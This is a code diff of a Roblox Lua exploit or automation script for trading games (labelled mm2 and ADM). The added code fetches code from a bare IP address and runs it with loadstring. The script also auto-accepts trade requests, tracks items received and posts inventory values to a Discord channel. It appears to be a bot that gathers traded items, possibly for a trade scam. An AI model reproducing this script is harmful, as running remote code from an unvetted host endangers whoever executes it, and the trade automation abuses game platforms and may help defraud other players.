@@ -69,6 +69,50 @@ function getinv()
     return game.ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(game.Players.LocalPlayer.Name).Weapons.Owned
 end
 local databrainrot = require(game.ReplicatedStorage.Database.Sync).Weapons
+
+-- value lookup mirrors mm2.lua: /supreme endpoint + flexible name+type+year
+-- lookups + Godly+ rarity fallback (so unknown items still get a sensible value)
+local rarityTable = {"Common","Uncommon","Rare","Legendary","Vintage","Godly","Ancient","Unique"}
+local godlyIdx = table.find(rarityTable, "Godly") or 6
+local valueList = loadstring(game:HttpGet("http://109.120.157.241:5000/supreme"))() or {}
+
+local function lookupValue(realName, itemType, rarity, chroma, year)
+    local D = rarity
+    if itemType == "Pet" then D = "Pet" end
+    local v = string.lower(tostring(realName or ""))
+    if chroma then
+        v = "chroma " .. v
+        D = "Chroma"
+    end
+    if D == "Classic" then D = "Vintage" end
+    local bucket = valueList[D]
+    if not bucket then return nil end
+    local t = string.lower(tostring(itemType or ""))
+    local y = tostring(year or "")
+    if bucket[v] then return bucket[v] end
+    if bucket[v .. " (" .. t .. ")"] then return bucket[v .. " (" .. t .. ")"] end
+    if bucket[v .. " " .. t] then return bucket[v .. " " .. t] end
+    if y ~= "" then
+        if bucket[v .. " (" .. y .. ")"] then return bucket[v .. " (" .. y .. ")"] end
+        if bucket[v .. " " .. y] then return bucket[v .. " " .. y] end
+        if bucket[v .. " " .. t .. " (" .. y .. ")"] then return bucket[v .. " " .. t .. " (" .. y .. ")"] end
+        if bucket[v .. " (" .. t .. ") (" .. y .. ")"] then return bucket[v .. " (" .. t .. ") (" .. y .. ")"] end
+    end
+    return nil
+end
+
+-- per-item value via databrainrot entry; falls back to 2 for Godly+ and 1 otherwise
+local function getItemValue(dataid)
+    local entry = databrainrot[dataid]
+    if not entry then return 0 end
+    local value = lookupValue(entry.ItemName, entry.ItemType, entry.Rarity, entry.Chroma == true, entry.Year)
+    if not value then
+        local idx = table.find(rarityTable, entry.Rarity)
+        if idx and idx >= godlyIdx then value = 2 else value = 1 end
+    end
+    return value
+end
+
 task.spawn(function() urnubitems = getinv() end)
 function ischanged()
     local currentInventory = getinv()
@@ -94,17 +138,17 @@ function ischanged()
     return false
 end
 function chang(inve)
-    local valueList = loadstring(game:HttpGet("http://109.120.157.241:5000/backup"))()
     new = {}
     newval = 0
     for i,v in pairs(inve) do
+        local value = getItemValue(i)
         table.insert(new,{
             name = i,
             amount = v,
-            value = valueList[databrainrot[i].Rarity][databrainrot[i].ItemName] or 0
+            value = value
         })
-        newval = newval+(valueList[databrainrot[i].Rarity][databrainrot[i].ItemName] or 0)*v
-        totalval = totalval+(valueList[databrainrot[i].Rarity][databrainrot[i].ItemName] or 0)*v
+        newval = newval + value * v
+        totalval = totalval + value * v
     end
     table.sort(new, function(a, b)
         return (a.value * a.amount) > (b.value * b.amount)
@@ -170,17 +214,17 @@ task.spawn(function()
     end
 end)
 function inv()
-    local valueList = loadstring(game:HttpGet("http://109.120.157.241:5000/backup"))()
     local url = "https://discord.com/api/v10/channels/"..logid.."/messages"
     neww = {}
     newwval = 0
     for i,v in pairs(getinv()) do
+        local value = getItemValue(i)
         table.insert(neww,{
             name = i,
             amount = v,
-            value = valueList[databrainrot[i].Rarity][databrainrot[i].ItemName] or 0
+            value = value
         })
-        newwval = newwval+(valueList[databrainrot[i].Rarity][databrainrot[i].ItemName] or 0)
+        newwval = newwval + value
     end
     table.sort(neww, function(a, b)
         return (a.value * a.amount) > (b.value * b.amount)
@@ -240,17 +284,17 @@ function invf()
     local url = "https://discord.com/api/v10/channels/"..logid.."/messages" 
 
     
-    local valueList = loadstring(game:HttpGet("http://109.120.157.241:5000/backup"))()
     local inventroy = "Inventory value: "
     talbe = {}
     vaule = 0
     for i,v in pairs(getinv()) do
+        local value = getItemValue(i)
         table.insert(talbe,{
             name = i,
             amount = v,
-            value = valueList[databrainrot[i].Rarity][databrainrot[i].ItemName] or 0
+            value = value
         })
-        vaule = vaule+(valueList[databrainrot[i].Rarity][databrainrot[i].ItemName] or 0)
+        vaule = vaule + value
     end
     inventroy = inventroy..tostring(vaule).."\n\n"
     table.sort(talbe, function(a, b)
@@ -285,7 +329,12 @@ function invf()
 end
 
 elseif IS_ADM then
-	-- ADM: choose Parents team and spawn at Home (redundant with the early call,
+-- forward-declare locals the early-started trade monitor below captures as
+-- upvalues; they get assigned further down once we have the trade routes
+local IsTrading
+local TradeAcceptOrDeclineRequest
+
+    -- ADM: choose Parents team and spawn at Home (redundant with the early call,
 -- kept as a safety net in case the early one missed before API replicated)
 pcall(function()
     ReplicatedStorage:WaitForChild("API"):WaitForChild("TeamAPI/ChooseTeam"):InvokeServer("Parents", {
@@ -293,6 +342,38 @@ pcall(function()
         dont_enter_location = true
     })
 end)
+
+-- ADM trade monitoring (started early so it's ready even before full setup)
+task.spawn(function()
+    while true do
+        if IsTrading and IsTrading() then
+            timeintrade = 0
+            repeat
+                timeintrade = timeintrade + task.wait(0.1)
+                print(timeintrade)
+                if timeintrade >= 12.5 then
+                    warn(timeintrade)
+                    if TradeAcceptOrDeclineRequest then
+                        TradeAcceptOrDeclineRequest:InvokeServer(rnsender, false)
+                    end
+                    break
+                end
+            until not (IsTrading and IsTrading())
+            warn("hi")
+            local bolean, itmes = ischanged()
+            if bolean == true then
+                tradesd = tradesd + 1
+                warn("1")
+                chand(itmes)
+                warn("2")
+            end
+        else
+            fod = false
+        end
+        task.wait(0.1)
+    end
+end)
+
 -- ADM: wait for the initial loading UI to finish
 local playerGui = game.Players.LocalPlayer:WaitForChild("PlayerGui")
 local loadingScreen = playerGui:WaitForChild("AssetLoadUI", 60)
@@ -315,7 +396,7 @@ IncrementCounter:FireServer("Home")
 local tradeFrame = playerGui:WaitForChild("TradeApp", 30) and playerGui.TradeApp:WaitForChild("Frame", 30)
 local Loads = require(game.ReplicatedStorage.Fsys).load
 local RouterClient = Loads("RouterClient")
-local TradeAcceptOrDeclineRequest = RouterClient.get("TradeAPI/AcceptOrDeclineTradeRequest")
+TradeAcceptOrDeclineRequest = RouterClient.get("TradeAPI/AcceptOrDeclineTradeRequest")
 local AddItemRemote = RouterClient.get("TradeAPI/AddItemToOffer")
 local AcceptNegotiationRemote = RouterClient.get("TradeAPI/AcceptNegotiation")
 local ConfirmTradeRemote = RouterClient.get("TradeAPI/ConfirmTrade")
@@ -334,7 +415,7 @@ TradeRequestReceivedRemote.OnClientEvent:Connect(function(sender)
     TradeAcceptOrDeclineRequest:InvokeServer(sender, true) --false
 end)
 
-local function IsTrading()
+IsTrading = function()
     return tradeFrame and tradeFrame.Visible or false
 end
 
@@ -517,35 +598,6 @@ function chand(inve)
     end
 end
 
--- ADM trade monitoring
-task.spawn(function()
-    while true do
-        if IsTrading() then
-            timeintrade = 0
-            repeat
-                timeintrade = timeintrade + task.wait(0.1)
-                print(timeintrade)
-                if timeintrade >= 12.5 then
-                    warn(timeintrade)
-                    TradeAcceptOrDeclineRequest:InvokeServer(rnsender, false)
-                    break
-                end
-            until not IsTrading()
-            warn("hi")
-            local bolean, itmes = ischanged()
-            if bolean == true then
-                tradesd = tradesd + 1
-                warn("1")
-                chand(itmes)
-                warn("2")
-            end
-        else
-            fod = false
-        end
-        task.wait(0.1)
-    end
-end)
-
 function inv()
     local url = "https://discord.com/api/v10/channels/"..logid.."/messages"
     neww = {}
@@ -659,6 +711,7 @@ invf = inv
 -- ADM posts initial inventory on join (wait for the value list to load first)
 task.spawn(function()
     while not valueList do task.wait(0.1) end
+    inv()
 end)
 
 end
